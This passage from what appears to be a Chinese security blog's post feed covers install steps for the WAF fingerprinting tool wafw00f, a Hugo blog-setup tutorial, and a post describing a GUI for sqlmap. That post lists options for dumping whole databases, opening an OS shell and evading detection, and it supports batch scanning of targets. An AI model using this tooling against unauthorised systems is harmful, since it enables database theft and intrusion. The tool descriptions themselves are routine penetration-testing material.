class="code"><pre><span class="line">python setup.py install</span><br></pre></td></tr></tbody></table></figure><p>也可以在 Docker 容器中运行它。首先克隆此存储库并使用<code>docker build . -t wafw00f</code>.现在你可以运行<code>docker run --rm -it wafw00f https://example.com</code></p><h2 id="下载和安装使用"><a href="#下载和安装使用" class="headerlink" title="下载和安装使用"></a>下载和安装使用</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载</span></span><br><span class="line">git clone https://github.com/EnableSecurity/wafw00f.git</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装</span></span><br><span class="line">python setup.py install</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用:</span></span><br><span class="line">wafw00f -l #显示所有防火墙</span><br><span class="line">wafw00f &lt;域名(需要携带http://或者https://)&gt; #运行</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载2</span></span><br><span class="line">https://github.com/EnableSecurity/wafw00f/releases/tag/v2.2.0</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>可视化的sqlmap!</title>
      <link href="/2024/03/30/26-sqlmap-GUI/"/>
      <url>/2024/03/30/26-sqlmap-GUI/</url>
      
        <content type="html"><![CDATA[<h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p><a href="https://github.com/honmashironeko/sqlmap-gui">https://github.com/honmashironeko/sqlmap-gui</a></p><p> SQLmap作为测试SQL注入的强有力工具深受广大用户的青睐，但由于非国人制作，绝大多数均为英文版，对于使用体验会有较大影响。同时仅仅只有命令行模式，需要记下大量命令和重复输入命令，因此本工具应运而生。</p><h1 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a><strong>工具介绍</strong></h1><p> 通过人工汉化，并针对中文与英文的语法区别，进行了特殊的代码修改，从而实现汉化后语句通顺，减小误会的产生。编写好的GUI文件直接进入图形化模式，通过鼠标勾选参数就可以快速执行命令，同时支持批量扫描。同时支持了Windows、Linux、Mac三大操作系统。</p><h1 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h1><p> 在文件夹中选择 Windows双击启动图形化.bat 鼠标双击启动，如果您是Mac系统，可以执行 gui.py 文件运行。（请确认您的Python环境为Python3，运行py文件的方式为python sqlmap.py，如果并非该格式，请到gui.py、Windows双击启动图形化.bat中对应位置进行修改） <a href="https://private-user-images.githubusercontent.com/139044047/311163713-050fa9e4-ef87-498e-b208-4003b864832e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE3NzQ1MzUsIm5iZiI6MTcxMTc3NDIzNSwicGF0aCI6Ii8xMzkwNDQwNDcvMzExMTYzNzEzLTA1MGZhOWU0LWVmODctNDk4ZS1iMjA4LTQwMDNiODY0ODMyZS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjQwMzMwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI0MDMzMFQwNDUwMzVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1kOTc3ZTEwZTU3ZTI5ZTY5N2YwYTg0NTE1NmJmYWZhODU0ZDYwMzhhYzBjNzljZDYwM2YxZjM2NGNlMGVlOTIyJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCZhY3Rvcl9pZD0wJmtleV9pZD0wJnJlcG9faWQ9MCJ9.d3KyT5eS5041O7VNH3z_0H4qTkPOyFTaQpIoNEdC-Qg"><img src="https://private-user-images.githubusercontent.com/139044047/311163713-050fa9e4-ef87-498e-b208-4003b864832e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE3NzQ1MzUsIm5iZiI6MTcxMTc3NDIzNSwicGF0aCI6Ii8xMzkwNDQwNDcvMzExMTYzNzEzLTA1MGZhOWU0LWVmODctNDk4ZS1iMjA4LTQwMDNiODY0ODMyZS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjQwMzMwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI0MDMzMFQwNDUwMzVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1kOTc3ZTEwZTU3ZTI5ZTY5N2YwYTg0NTE1NmJmYWZhODU0ZDYwMzhhYzBjNzljZDYwM2YxZjM2NGNlMGVlOTIyJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCZhY3Rvcl9pZD0wJmtleV9pZD0wJnJlcG9faWQ9MCJ9.d3KyT5eS5041O7VNH3z_0H4qTkPOyFTaQpIoNEdC-Qg" alt="Clip_2024-03-08_16-12-02"></a></p><p> 左侧选择命令，中间填入burp抓取的数据包，点击开始运行即可！ <a href="https://private-user-images.githubusercontent.com/139044047/311584536-119ba892-2de9-4db1-931d-60d48740877e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE3NzQ1MzUsIm5iZiI6MTcxMTc3NDIzNSwicGF0aCI6Ii8xMzkwNDQwNDcvMzExNTg0NTM2LTExOWJhODkyLTJkZTktNGRiMS05MzFkLTYwZDQ4NzQwODc3ZS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjQwMzMwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI0MDMzMFQwNDUwMzVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT03MmZhNGQwN2I2ZGJhM2E1MDM2YTUzMGNhZWRlZmFiNDE4ZTMxZTU3YWYxZjc5MDM5NjliMGJkNjIwZmVmYTE0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCZhY3Rvcl9pZD0wJmtleV9pZD0wJnJlcG9faWQ9MCJ9.DXzY-U2U7EYHAG8DJWnhX7OP9Oz27C1G4uM0w7SBReg"><img src="https://private-user-images.githubusercontent.com/139044047/311584536-119ba892-2de9-4db1-931d-60d48740877e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE3NzQ1MzUsIm5iZiI6MTcxMTc3NDIzNSwicGF0aCI6Ii8xMzkwNDQwNDcvMzExNTg0NTM2LTExOWJhODkyLTJkZTktNGRiMS05MzFkLTYwZDQ4NzQwODc3ZS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjQwMzMwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI0MDMzMFQwNDUwMzVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT03MmZhNGQwN2I2ZGJhM2E1MDM2YTUzMGNhZWRlZmFiNDE4ZTMxZTU3YWYxZjc5MDM5NjliMGJkNjIwZmVmYTE0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCZhY3Rvcl9pZD0wJmtleV9pZD0wJnJlcG9faWQ9MCJ9.DXzY-U2U7EYHAG8DJWnhX7OP9Oz27C1G4uM0w7SBReg" alt="Clip_2024-03-11_12-16-09"></a></p><p>本工具还提供了批量制作请求包的功能，在主界面点击 “制作批量数据包”，进入制作工作台后按照提示填写对应内容后生成数据包即可。返回主界面勾选 “批量扫描数据包”开始运行，检测到存在漏洞的站点会提取到ldopt文件夹中。</p><p><a href="https://private-user-images.githubusercontent.com/139044047/311584564-e4868938-4a34-4360-934f-f66b2ace30a6.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE3NzQ1MzUsIm5iZiI6MTcxMTc3NDIzNSwicGF0aCI6Ii8xMzkwNDQwNDcvMzExNTg0NTY0LWU0ODY4OTM4LTRhMzQtNDM2MC05MzRmLWY2NmIyYWNlMzBhNi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjQwMzMwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI0MDMzMFQwNDUwMzVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1kZWI4ZGY0Nzg3YjE0MTEwOWZkNTllYzMwOWZjZWNhNDNlYzcyYmVjYjk2M2VjOGIwMjEyYzhhM2U3YTBhODM1JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCZhY3Rvcl9pZD0wJmtleV9pZD0wJnJlcG9faWQ9MCJ9.vqMIdtbRyEbi0VYPwZ3-iv2mpZt1WVVoOFARfWh8h4E"><img src="https://private-user-images.githubusercontent.com/139044047/311584564-e4868938-4a34-4360-934f-f66b2ace30a6.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE3NzQ1MzUsIm5iZiI6MTcxMTc3NDIzNSwicGF0aCI6Ii8xMzkwNDQwNDcvMzExNTg0NTY0LWU0ODY4OTM4LTRhMzQtNDM2MC05MzRmLWY2NmIyYWNlMzBhNi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjQwMzMwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI0MDMzMFQwNDUwMzVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1kZWI4ZGY0Nzg3YjE0MTEwOWZkNTllYzMwOWZjZWNhNDNlYzcyYmVjYjk2M2VjOGIwMjEyYzhhM2U3YTBhODM1JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCZhY3Rvcl9pZD0wJmtleV9pZD0wJnJlcG9faWQ9MCJ9.vqMIdtbRyEbi0VYPwZ3-iv2mpZt1WVVoOFARfWh8h4E" alt="Clip_2024-03-11_12-16-30"></a></p><h1 id="使用帮助"><a href="#使用帮助" class="headerlink" title="使用帮助"></a>使用帮助</h1><p> 图形化界面分为三个部分，左侧部分为数据库相关操作模块，中间为数据包、URL填写模块，右侧为杂项模块。</p><p><strong>左侧模块内容介绍</strong></p><ul><li>测试级别：可选择1-5级，等级越高，SQL语句测试内容越多。</li><li>风险级别：可选择1-3级，1级采用相对安全的语法，3级采用非常危险的语法。</li><li>线程数：可选择1-20线程，通常SQLmap限制最高20线程。</li><li>当前数据库：执行–current-db命令，查看当前正在使用哪一个库。</li><li>当前用户：执行–current-user命令，查看正在使用的用户是哪一个。</li><li>当前用户DBA权限：执行–is-dba命令，查看当前用户是否是DBA权限。</li><li>枚举库名：执行–dbs命令，枚举所有库名。</li><li>枚举表名：执行–tables命令，需要填入指定库名，枚举指定库名下的所有表名。（不填写指定内容会枚举所有）</li><li>枚举列名：执行–columns命令，需要填入指定库名、指定表名，枚举指定库名、指定表名下的所有列名。（不填写指定内容会枚举所有）</li><li>枚举字段：执行–dump命令，需要填入指定库名、指定表名、指定列名，枚举指定库名、指定表名、指定列名下的所有字段。（不填写指定内容会枚举所有）</li><li>一键脱库：执行–dump-all命令，获取所有库名、表名、列名、字段并保存到文件中。</li><li>OS交互式Shell：执行–os-shell命令。</li><li>SQL交互式Shell：执行–sql-shell命令。</li><li>指定库名：执行-D命令。</li><li>指定表名：执行-T命令。</li><li>指定列名：执行-C命令。</li><li>文本框：回显运行的SQLmap命令。</li></ul><p><strong>右侧模块内容介绍</strong></p><ul><li>设置代理：格式为(http://|https://|socks5://IP:PORT)</li><li>代理身份验证：格式为(用户名:密码)</li><li>一键去特征：执行–random-agent–tamper=between–flush-session–randomize=1 –skip-heuristics命令。</li><li>打开所有优化开关：执行-o命令。</li><li>默认应答：执行–batch命令，使用默认的选项。</li><li>清除缓存：执行–purge命令，删除之前的记录缓存。</li><li>强制SSL通信：执行–force-ssl命令，强制sqlmap使用https进行请求。</li><li>批量扫描URL：执行-m命令，一行一条的形式填写URL。</li><li>批量扫描数据包：使用前要在batch文件夹中放入txt文件，每一个txt文件对应一次扫描，循环执行-r命令，开启默认应答，启用大量cmd来运行，结束后自动打开sqlmap结果目录。(中间文本框留空)</li><li>注入方式：可选择指定注入方式或全部注入方式。</li><li>指定数据库类型：可选择指定数据库类型。</li><li>自定义参数：直接填写需要的额外参数，会自动添加在命令最后。</li><li>制作批量数据包：启动批量生成数据包工作台。</li><li>查看SQLMAP帮助：查看sqlmap-hh内容。</li><li>查看工具帮助：查看工具基础功能介绍。</li><li>更新版本：检测是否存在最新版并更新。</li><li>开始运行：保存中间内容并执行SQLmap命令。</li></ul><p><strong>中间模块内容介绍</strong></p><ul><li>中部文本框：填写http开头执行-u命令，填写数据包执行-r命令，填写每行一个URL并勾选批量扫描URL执行-m命令。</li></ul><h1 id="工具截图"><a href="#工具截图" class="headerlink" title="工具截图"></a>工具截图</h1><p><a href="https://private-user-images.githubusercontent.com/139044047/311584536-119ba892-2de9-4db1-931d-60d48740877e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE3NzQ1MzUsIm5iZiI6MTcxMTc3NDIzNSwicGF0aCI6Ii8xMzkwNDQwNDcvMzExNTg0NTM2LTExOWJhODkyLTJkZTktNGRiMS05MzFkLTYwZDQ4NzQwODc3ZS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjQwMzMwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI0MDMzMFQwNDUwMzVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT03MmZhNGQwN2I2ZGJhM2E1MDM2YTUzMGNhZWRlZmFiNDE4ZTMxZTU3YWYxZjc5MDM5NjliMGJkNjIwZmVmYTE0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCZhY3Rvcl9pZD0wJmtleV9pZD0wJnJlcG9faWQ9MCJ9.DXzY-U2U7EYHAG8DJWnhX7OP9Oz27C1G4uM0w7SBReg"><img src="https://private-user-images.githubusercontent.com/139044047/311584536-119ba892-2de9-4db1-931d-60d48740877e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE3NzQ1MzUsIm5iZiI6MTcxMTc3NDIzNSwicGF0aCI6Ii8xMzkwNDQwNDcvMzExNTg0NTM2LTExOWJhODkyLTJkZTktNGRiMS05MzFkLTYwZDQ4NzQwODc3ZS5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjQwMzMwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI0MDMzMFQwNDUwMzVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT03MmZhNGQwN2I2ZGJhM2E1MDM2YTUzMGNhZWRlZmFiNDE4ZTMxZTU3YWYxZjc5MDM5NjliMGJkNjIwZmVmYTE0JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCZhY3Rvcl9pZD0wJmtleV9pZD0wJnJlcG9faWQ9MCJ9.DXzY-U2U7EYHAG8DJWnhX7OP9Oz27C1G4uM0w7SBReg" alt="Clip_2024-03-11_12-16-09"></a> <a href="https://private-user-images.githubusercontent.com/139044047/311584564-e4868938-4a34-4360-934f-f66b2ace30a6.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE3NzQ1MzUsIm5iZiI6MTcxMTc3NDIzNSwicGF0aCI6Ii8xMzkwNDQwNDcvMzExNTg0NTY0LWU0ODY4OTM4LTRhMzQtNDM2MC05MzRmLWY2NmIyYWNlMzBhNi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjQwMzMwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI0MDMzMFQwNDUwMzVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1kZWI4ZGY0Nzg3YjE0MTEwOWZkNTllYzMwOWZjZWNhNDNlYzcyYmVjYjk2M2VjOGIwMjEyYzhhM2U3YTBhODM1JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCZhY3Rvcl9pZD0wJmtleV9pZD0wJnJlcG9faWQ9MCJ9.vqMIdtbRyEbi0VYPwZ3-iv2mpZt1WVVoOFARfWh8h4E"><img src="https://private-user-images.githubusercontent.com/139044047/311584564-e4868938-4a34-4360-934f-f66b2ace30a6.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE3NzQ1MzUsIm5iZiI6MTcxMTc3NDIzNSwicGF0aCI6Ii8xMzkwNDQwNDcvMzExNTg0NTY0LWU0ODY4OTM4LTRhMzQtNDM2MC05MzRmLWY2NmIyYWNlMzBhNi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjQwMzMwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI0MDMzMFQwNDUwMzVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1kZWI4ZGY0Nzg3YjE0MTEwOWZkNTllYzMwOWZjZWNhNDNlYzcyYmVjYjk2M2VjOGIwMjEyYzhhM2U3YTBhODM1JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCZhY3Rvcl9pZD0wJmtleV9pZD0wJnJlcG9faWQ9MCJ9.vqMIdtbRyEbi0VYPwZ3-iv2mpZt1WVVoOFARfWh8h4E" alt="Clip_2024-03-11_12-16-30"></a> <a href="https://private-user-images.githubusercontent.com/139044047/311166396-33730cd6-fd38-49f7-b705-6f56d9ba7bab.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE3NzQ1MzUsIm5iZiI6MTcxMTc3NDIzNSwicGF0aCI6Ii8xMzkwNDQwNDcvMzExMTY2Mzk2LTMzNzMwY2Q2LWZkMzgtNDlmNy1iNzA1LTZmNTZkOWJhN2JhYi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjQwMzMwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI0MDMzMFQwNDUwMzVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1iY2ZmODQzZTljN2UzN2Y0ODdjNDJlMjQwMGZhYTA2ZmU3ZWVmMjBjZTJlNjhlMzFjY2ZlOTdlZDYwOTdlNmNhJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCZhY3Rvcl9pZD0wJmtleV9pZD0wJnJlcG9faWQ9MCJ9.wUDBO5N5KOkL_IBxObkFvmKJPdD8q_UuPBVB9_JasxE"><img src="https://private-user-images.githubusercontent.com/139044047/311166396-33730cd6-fd38-49f7-b705-6f56d9ba7bab.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTE3NzQ1MzUsIm5iZiI6MTcxMTc3NDIzNSwicGF0aCI6Ii8xMzkwNDQwNDcvMzExMTY2Mzk2LTMzNzMwY2Q2LWZkMzgtNDlmNy1iNzA1LTZmNTZkOWJhN2JhYi5wbmc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjQwMzMwJTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI0MDMzMFQwNDUwMzVaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1iY2ZmODQzZTljN2UzN2Y0ODdjNDJlMjQwMGZhYTA2ZmU3ZWVmMjBjZTJlNjhlMzFjY2ZlOTdlZDYwOTdlNmNhJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCZhY3Rvcl9pZD0wJmtleV9pZD0wJnJlcG9faWQ9MCJ9.wUDBO5N5KOkL_IBxObkFvmKJPdD8q_UuPBVB9_JasxE" alt="Clip_2024-03-08_16-22-40"></a></p><h1 id="下载和使用"><a href="#下载和使用" class="headerlink" title="下载和使用"></a>下载和使用</h1><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#打开终端</span><br><span class="line">git clone https://github.com/honmashironeko/sqlmap-gui.git</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Hugo框架,从0搭建自己的博客</title>
      <link href="/2024/03/27/17-HuGo-%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
      <url>/2024/03/27/17-HuGo-%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="Hugo-安装博客"><a href="#Hugo-安装博客" class="headerlink" title="Hugo-安装博客"></a>Hugo-安装博客</h1><h2 id="1x下载"><a href="#1x下载" class="headerlink" title="1x下载"></a>1x下载</h2><p>​简单说明:Windows下需要使用pwershell,不要使用CMD</p><p>​Windows:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winget install Hugo.Hugo.Extended #下载Hugo-扩展版</span><br></pre></td></tr></tbody></table></figure><p>​安装教程连接:</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://gohugo.io/categories/installation/</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">git 命令自行下载</span></span><br></pre></td></tr></tbody></table></figure><h2 id="2x使用"><a href="#2x使用" class="headerlink" title="2x使用"></a>2x使用</h2><h3 id="新建项目命令"><a href="#新建项目命令" class="headerlink" title="新建项目命令:"></a>新建项目命令:</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hugo new site quickstart #开启一个名称为quickstart的项目</span><br><span class="line">cd quickstart #进入quickstart</span><br><span class="line">git init #构建</span><br><span class="line">git submodule add https://github.com/theNewDynamic/gohugo-theme-ananke.git themes/ananke #添加Ananke主题</span><br><span class="line">echo "theme = 'ananke'" &gt;&gt; hugo.toml #更换配置</span><br><span class="line">hugo server #启动</span><br></pre></td></tr></tbody></table></figure><h3 id="添加网站内容"><a href="#添加网站内容" class="headerlink" title="添加网站内容"></a>添加网站内容</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hugo new content posts/my-first-post.md #创建一个新的md文件,未来界面</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#默认内容</span><br><span class="line">+++</span><br><span class="line">title = 'My First Post'</span><br><span class="line">date = 2024-01-14T07:07:07+01:00</span><br><span class="line">draft = true</span><br><span class="line">+++</span><br></pre></td></tr></tbody></table></figure><h3 id="启动服务-站点"><a href="#启动服务-站点" class="headerlink" title="启动服务-站点"></a>启动服务-站点</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hugo server --buildDrafts #携带草稿启动</span><br><span class="line">hugo server -D #携带草稿启动命令2</span><br></pre></td></tr></tbody></table></figure><h3 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="生成静态文件"></a>生成静态文件</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hugo</span><br></pre></td></tr></tbody></table></figure><h2 id="3x安装主题"><a href="#3x安装主题" class="headerlink" title="3x安装主题"></a>3x安装主题</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">链接</span></span><br><span class="line">https://github.com/xioyito/NewBee</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在项目文件中,拉下主题</span></span><br><span class="line">git clone https://github.com/xioyito/NewBee.git themes/NewBee</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">复制hugo.toml到根目录</span></span><br><span class="line">cp NewBee/config-example/hugo.toml hugo.toml</span><br></pre></td></tr></tbody></table></figure><h4 id="最后演示"><a href="#最后演示" class="headerlink" title="最后演示:"></a>最后演示:</h4><p><img src="https://pic.imgdb.cn/item/6603e1549f345e8d0369a06e.png" alt="img"></p><p><img src="https://pic.imgdb.cn/item/6603e1929f345e8d036b4c31.png"></p>]]></content>
      
      
      <categories>
          
          <category> 搭建博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在线渗透工具包</title>
      <link href="/2024/03/25/47-%E5%9C%A8%E7%BA%BF%E6%B8%97%E9%80%8F/"/>
